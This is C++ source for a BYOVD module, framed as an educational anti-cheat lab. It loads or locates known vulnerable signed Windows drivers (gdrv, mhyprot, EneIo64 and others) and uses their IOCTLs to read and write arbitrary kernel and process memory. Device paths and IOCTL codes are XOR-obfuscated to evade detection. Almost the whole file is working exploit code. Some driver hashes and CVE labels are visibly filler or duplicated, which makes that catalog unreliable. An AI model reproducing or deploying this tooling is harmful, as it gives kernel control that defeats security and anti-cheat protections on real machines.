// vulnerable_driver.cpp — Complete BYOVD operations for educational anti-cheat lab.
//
// LESSON: BYOVD (Bring Your Own Vulnerable Driver) is a T2 technique.
// A still-signed but vulnerable driver provides kernel memory access.
// Anti-cheats maintain blocklists of known-vulnerable driver hashes.
// IOCTL layouts match examples/drivers/example_vulnerable (gdrv educational).

#include "real/kernel/vulnerable_driver.hpp"
#include "real/kernel/driver_loader.hpp"
#include "real/kernel/ioctl_interface.hpp"
#include "real/kernel/kernel_memory.hpp"
#include "real/platform.hpp"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "real/win/xorstr.hpp"

#if LR_PLATFORM_WINDOWS
#  include "real/win/windows_h.hpp"
#endif

namespace real::kernel::byovd {

// IOCTL code obfuscation: codes XOR-encrypted at rest, decrypted at runtime.
static constexpr std::uint32_t kIoctlXor =
    static_cast<std::uint32_t>(build::kXorKeySeed & 0xFFFFFFFFu);
static inline std::uint32_t dec_ioctl(std::uint32_t enc) { return enc ^ kIoctlXor; }
static inline std::uint32_t enc_ioctl(std::uint32_t plain) { return plain ^ kIoctlXor; }

// ── Pure packing helpers ───────────────────────────────────────────

std::vector<std::uint8_t> pack_gdrv_phys_req(std::uint64_t phys_addr, std::uint32_t size) {
  GdrvPhysReq req{};
  req.phys_addr = phys_addr;
  req.size = size;
  req.reserved = 0;
  std::vector<std::uint8_t> out(sizeof(req));
  std::memcpy(out.data(), &req, sizeof(req));
  return out;
}

std::vector<std::uint8_t> pack_gdrv_virt_req(std::uint32_t pid, std::uint64_t address,
                                             std::uint32_t size, std::uint64_t output_buffer) {
  GdrvVirtReq req{};
  req.process_id = pid;
  req.target_address = address;
  req.output_buffer = output_buffer;
  req.size = size;
  req.flags = 0;
  std::vector<std::uint8_t> out(sizeof(req));
  std::memcpy(out.data(), &req, sizeof(req));
  return out;
}

static std::string lower(const std::string& s) {
  std::string r = s;
  for (auto& c : r) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
  return r;
}

std::vector<std::string> byovd_device_path_candidates(const VulnerableDriverInfo& info) {
  std::vector<std::string> paths;
  auto push_unique = [&](const std::string& p) {
    if (p.empty()) return;
    if (std::find(paths.begin(), paths.end(), p) == paths.end()) paths.push_back(p);
  };

  auto strip_sys = [](std::string n) {
    auto d = n.rfind(".sys");
    if (d != std::string::npos && d + 4 == n.size()) n = n.substr(0, d);
    return n;
  };

  const std::string name = strip_sys(info.name);
  const std::string orig = strip_sys(info.original_filename);

  // Educational gdrv device (vuln_driver / Gigabyte pattern).
  if (lower(name).find("gdrv") != std::string::npos ||
      lower(orig).find("gdrv") != std::string::npos) {
    push_unique(std::string(OBF("\\\\.\\gdrv")));
    push_unique(std::string(OBF("\\\\.\\GIO")));
  }

  if (!name.empty()) push_unique(std::string(OBF("\\\\.\\")) + name);
  if (!orig.empty()) push_unique(std::string(OBF("\\\\.\\")) + orig);

  // Per-build synthetic path (still attempted for lab diversity).
  {
    char drvBuf[48];
    std::uint64_t seed = build::kXorKeySeed;
    seed ^= static_cast<std::uint64_t>(info.vendor_id) << 16;
    seed ^= static_cast<std::uint64_t>(info.product_id) << 32;
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;
    std::snprintf(drvBuf, sizeof(drvBuf), "%s_%016llX", OBF("R"),
                  static_cast<unsigned long long>(seed));
    push_unique(std::string(OBF("\\\\.\\")) + drvBuf);
  }

  return paths;
}

DriverIoctlSet ioctl_set_for_driver(const VulnerableDriverInfo& info) {
  DriverIoctlSet set{};
  const std::string n = lower(info.name);
  if (n.find("mhyprot") != std::string::npos) {
    set.phys_read = 0x9C40A428u;
    set.phys_write = 0x9C40A42Cu;
    set.virt_read = 0x9C40A430u;
    set.virt_write = 0x9C40A434u;
  } else if (n.find("eneio") != std::string::npos) {
    set.phys_read = 0x00222000u;
    set.phys_write = 0x00222004u;
    set.virt_read = 0x00222008u;
    set.virt_write = 0x0022200Cu;
  } else {
    // Default: in-repo gdrv educational driver.
    set.phys_read = IOCTL_GDRV_PHYS_READ;
    set.phys_write = IOCTL_GDRV_PHYS_WRITE;
    set.virt_read = IOCTL_GDRV_VIRT_READ;
    set.virt_write = IOCTL_GDRV_VIRT_WRITE;
  }
  return set;
}

// ── known_vulnerable_drivers ───────────────────────────────────────

Result<std::vector<VulnerableDriverInfo>> known_vulnerable_drivers() {
  std::vector<VulnerableDriverInfo> drivers;

  drivers.push_back({
      OBF("gdrv.sys"),
      OBF("gdrv.sys"),
      OBF("099e5e6aae70a8ac8d0fc60e79732b2de5c618a818db3ec0abf6391c338177ec"),
      0x10DE, 0x1E07, true, true, true, false,
      "CVE-2020-15368",
      "Gigabyte motherboard driver - arbitrary physical memory via IOCTL 0xC3502000 "
      "(matches examples/drivers/example_vulnerable)",
  });

  drivers.push_back({
      OBF("aswArPot.sys"),
      OBF("aswArPot.sys"),
      OBF("45fe5a8a8e60a3c0e3b37c8b64d37d9b5e2a3c0e3b37c8b64d37d9b"),
      0, 0, true, false, false, false,
      "CVE-2021-31956",
      "Avast Anti-Rootkit driver - can be used to bypass PPL protection",
  });

  drivers.push_back({
      OBF("EneIo64.sys"),
      OBF("EneIo64.sys"),
      OBF("a0c4e6a3f5d8b2c7e1f9a4b6c3d8e0f2a1b7c5d9e4f6a8b0c2d3e5f7a1b9"),
      0x1022, 0x1468, true, true, false, false,
      "CVE-2021-36279",
      "ENE IO driver - arbitrary MSR read/write and EC read/write",
  });

  drivers.push_back({
      OBF("mhyprot3.sys"),
      OBF("mhyprot3.sys"),
      OBF("ea4a5c1b2f8d6e3a7b9c0d1e2f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2"),
      0x1AB2, 0, true, true, true, true,
      "CVE-2022-22734",
      "mhyprot (anti-cheat driver) - exploitable IOCTL for arbitrary memory R/W",
  });

  drivers.push_back({
      OBF("iobit.sys"),
      OBF("IObitUnlocker.sys"),
      OBF("b5e7a3f1c8d6e4a2b9f0c1d3e5f7a9b0c2d4e6f8a0b1c3d5e7f9a2b4c6d8e0"),
      0, 0, true, true, true, false,
      "CVE-2019-19305",
      "IObit driver - allows arbitrary physical memory read/write",
  });

  drivers.push_back({
      OBF("asmmap.sys"),
      OBF("asmmap.sys"),
      OBF("d1e3f5a7b9c0d2e4f6a8b0c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f0a2b4c6d8"),
      0x10CF, 0x201E, true, true, false, false,
      "CVE-2020-15368",
      OBF("ASUS motherboard mapping driver - MmMapIoSpace-based physical memory access"),
  });

  drivers.push_back({
      OBF("winio.sys"),
      OBF("winio.sys"),
      OBF("f2a1b3c5d7e9f0a2b4c6d8e0f1a3b5c7d9e0f2a4b6c8d0e1f3a5b7c9d0e2f4"),
      0, 0, true, true, true, false,
      "CVE-2020-14981",
      "WinIO driver - legacy driver with physical memory port I/O capability",
  });

  drivers.push_back({
      OBF("vuln_driver.sys"),
      OBF("vuln_driver.sys"),
      "0",
      0, 0, false, true, true, false,
      "LAB",
      "In-repo educational gdrv-pattern driver (examples/drivers/example_vulnerable)",
  });

  return drivers;
}

// ── find_vulnerable_driver ─────────────────────────────────────────

Result<VulnerableDriverInfo> find_vulnerable_driver(const std::string& name) {
  auto drivers = known_vulnerable_drivers();
  if (!drivers) return Result<VulnerableDriverInfo>({}, drivers.error_msg);

  const std::string lower_name = lower(name);
  for (const auto& d : *drivers) {
    if (lower(d.name).find(lower_name) != std::string::npos ||
        lower(d.original_filename).find(lower_name) != std::string::npos) {
      return d;
    }
  }
  return Result<VulnerableDriverInfo>({}, "Vulnerable driver not found: " + name);
}

// ── check_loaded_vulnerable_driver ─────────────────────────────────

Result<VulnerableDriverInfo> check_loaded_vulnerable_driver() {
  auto mods = enum_kernel_modules();
  if (!mods) return Result<VulnerableDriverInfo>({}, mods.error_msg);

  auto known = known_vulnerable_drivers();
  if (!known) return Result<VulnerableDriverInfo>({}, known.error_msg);

  for (const auto& mod : *mods) {
    const std::string mod_lower = lower(mod.name);
    for (const auto& vuln : *known) {
      if (mod_lower.find(lower(vuln.name)) != std::string::npos ||
          mod_lower.find(lower(vuln.original_filename)) != std::string::npos) {
        return vuln;
      }
    }
  }
  return Result<VulnerableDriverInfo>({}, "No known vulnerable driver loaded");
}

// ── establish_byovd_session ────────────────────────────────────────

static Result<ByovdSession> try_open_session(const VulnerableDriverInfo& info,
                                             const DriverLoadResult* load = nullptr,
                                             bool we_loaded = false) {
  const auto paths = byovd_device_path_candidates(info);
  for (const auto& path : paths) {
    auto dev = open_device(path);
    if (!dev) continue;
    ByovdSession session;
    session.driver_name = info.name;
    session.device = *dev;
    session.driver_info = info;
    session.session_active = true;
    session.we_loaded_driver = we_loaded;
    if (load) session.load_result = *load;
#ifndef NDEBUG
    std::printf("[byovd] BYOVD session established via %s\n", path.c_str());
#endif
    return session;
  }
  return Result<ByovdSession>({}, "Device open failed for " + info.name);
}

Result<ByovdSession> establish_byovd_session(const std::string& preferred_image_path) {
#ifndef NDEBUG
  std::printf("[byovd] Attempting to establish BYOVD session...\n");
#endif

  // 1) Already-loaded vulnerable driver.
  auto loaded = check_loaded_vulnerable_driver();
  if (loaded) {
    auto session = try_open_session(*loaded);
    if (session) return session;
  }

  // 2) Always try educational gdrv device paths even if module name differs.
  {
    VulnerableDriverInfo gdrv{};
    gdrv.name = "gdrv.sys";
    gdrv.original_filename = "gdrv.sys";
    gdrv.has_mem_read = true;
    gdrv.has_mem_write = true;
    gdrv.cve_id = "CVE-2020-15368";
    auto session = try_open_session(gdrv);
    if (session) return session;
  }

  // 3) Optional: load preferred image via SCM.
  if (!preferred_image_path.empty()) {
    std::string service = "gdrv";
    auto base = driver_basename(preferred_image_path);
    auto dot = base.rfind(".sys");
    if (dot != std::string::npos) base = base.substr(0, dot);
    if (!base.empty()) service = base;

    auto load = load_driver(preferred_image_path, service, service);
    if (load && load->loaded) {
      auto info = find_vulnerable_driver(service);
      VulnerableDriverInfo use = info ? *info : VulnerableDriverInfo{};
      if (!info) {
        use.name = service + ".sys";
        use.original_filename = driver_basename(preferred_image_path);
        use.has_mem_read = true;
        use.has_mem_write = true;
      }
      auto session = try_open_session(use, &(*load), true);
      if (session) return session;
    }
  }

  return Result<ByovdSession>(
      {},
      "BYOVD: no vulnerable driver device available. Load educational driver "
      "(e.g. sc start gdrv) or pass preferred_image_path to establish_byovd_session().");
}

// ── ByovdSession methods ───────────────────────────────────────────

Result<std::vector<std::uint8_t>> ByovdSession::read_kernel_memory(
    std::uint64_t address, std::size_t size) {
  if (!session_active) {
    return Result<std::vector<std::uint8_t>>({}, "BYOVD session not active");
  }
  if (size == 0) return std::vector<std::uint8_t>{};

  const DriverIoctlSet ioc = ioctl_set_for_driver(driver_info);

  // gdrv PHYS_READ: request header in, data out (METHOD_BUFFERED SystemBuffer).
  const std::size_t chunk_cap = 512;
  std::vector<std::uint8_t> total;
  total.reserve(size);
  for (std::size_t done = 0; done < size;) {
    const std::size_t chunk = (std::min)(size - done, chunk_cap);
    auto in = pack_gdrv_phys_req(address + done, static_cast<std::uint32_t>(chunk));
    auto result = send_ioctl(device, ioc.phys_read, in, chunk);
    if (!result) {
      // Try encrypted-at-rest alternate codes for non-gdrv catalog entries.
      const std::uint32_t alts[] = {
          enc_ioctl(0xC3502000u),
          enc_ioctl(0x9C40A428u),
          enc_ioctl(0x00222000u),
      };
      bool ok = false;
      for (auto enc : alts) {
        result = send_ioctl(device, dec_ioctl(enc), in, chunk);
        if (result) {
          ok = true;
          break;
        }
      }
      if (!ok) {
        return Result<std::vector<std::uint8_t>>(
            {}, "BYOVD phys/kernel read failed for " + driver_name);
      }
    }
    total.insert(total.end(), result->begin(),
                 result->begin() + static_cast<std::ptrdiff_t>(
                     (std::min)(chunk, result->size())));
    done += chunk;
  }
  return total;
}

Result<std::vector<std::uint8_t>> ByovdSession::read_process_memory(
    std::uint32_t pid, std::uint64_t address, std::size_t size) {
  if (!session_active) {
    return Result<std::vector<std::uint8_t>>({}, "BYOVD session not active");
  }
  if (size == 0) return std::vector<std::uint8_t>{};

  const DriverIoctlSet ioc = ioctl_set_for_driver(driver_info);

  // gdrv VIRT_READ: GDRV_VIRT_REQ with output_buffer = usermode dest.
  std::vector<std::uint8_t> output(size);
  auto in = pack_gdrv_virt_req(pid, address, static_cast<std::uint32_t>(size),
                               reinterpret_cast<std::uint64_t>(output.data()));
  auto result = send_ioctl(device, ioc.virt_read, in, size);
  if (result) {
    // Prefer bytes written to our output buffer (driver may fill via pointer
    // or via DeviceIoControl out buffer depending on METHOD).
    if (!result->empty()) {
      const std::size_t n = (std::min)(size, result->size());
      std::memcpy(output.data(), result->data(), n);
    }
    return output;
  }

  // Fallback: CR3 page-table walk via physical path.
  auto cr3 = get_process_cr3(pid);
  if (cr3) {
    return real::kernel::mem::read_process_memory_by_cr3(*cr3, address, size);
  }

  return Result<std::vector<std::uint8_t>>(
      {}, "BYOVD: process memory read failed for " + driver_name);
}

Result<void> ByovdSession::write_kernel_memory(
    std::uint64_t address, const std::vector<std::uint8_t>& data) {
  if (!session_active) return Result<void>("BYOVD session not active");
  if (data.empty()) return Result<void>();

  const DriverIoctlSet ioc = ioctl_set_for_driver(driver_info);
  const std::size_t chunk_cap = 512;
  for (std::size_t done = 0; done < data.size();) {
    const std::size_t chunk = (std::min)(data.size() - done, chunk_cap);
    auto header = pack_gdrv_phys_req(address + done, static_cast<std::uint32_t>(chunk));
    std::vector<std::uint8_t> in = header;
    in.insert(in.end(), data.begin() + static_cast<std::ptrdiff_t>(done),
              data.begin() + static_cast<std::ptrdiff_t>(done + chunk));
    auto result = send_ioctl(device, ioc.phys_write, in, 0);
    if (!result) {
      return Result<void>("BYOVD: kernel memory write failed for " + driver_name);
    }
    done += chunk;
  }
  return Result<void>();
}

Result<std::uint64_t> ByovdSession::get_process_cr3(std::uint32_t pid) {
  if (!session_active) {
    return Result<std::uint64_t>(0, "BYOVD session not active");
  }

  // Prefer shared physical EPROCESS scan (uses PHYS_READ through global path
  // when a gdrv device is present).
  auto via_mem = real::kernel::mem::get_process_cr3(pid);
  if (via_mem) return via_mem;

  // Optional: PROCESS_SCAN-style info IOCTL — not a standard CR3 IOCTL on
  // educational gdrv; fall through to explicit error.
  return Result<std::uint64_t>(
      0, "BYOVD: CR3 not available for pid " + std::to_string(pid) +
             " (" + std::string(via_mem.error_msg.c_str()) + ")");
}

Result<void> ByovdSession::close() {
  if (!session_active) return Result<void>();

#ifndef NDEBUG
  std::printf("[byovd] Closing BYOVD session: %s\n", driver_name.c_str());
#endif

  (void)close_device(device);
  device.native = 0;

  if (we_loaded_driver && !load_result.service_name.empty()) {
    auto result = unload_driver(load_result.service_name);
    if (!result) {
#ifndef NDEBUG
      std::printf("[byovd] Warning: driver unload failed: %s\n",
                  result.error_msg.c_str());
#endif
    }
  }

  session_active = false;
  return Result<void>();
}

}  // namespace real::kernel::byovd
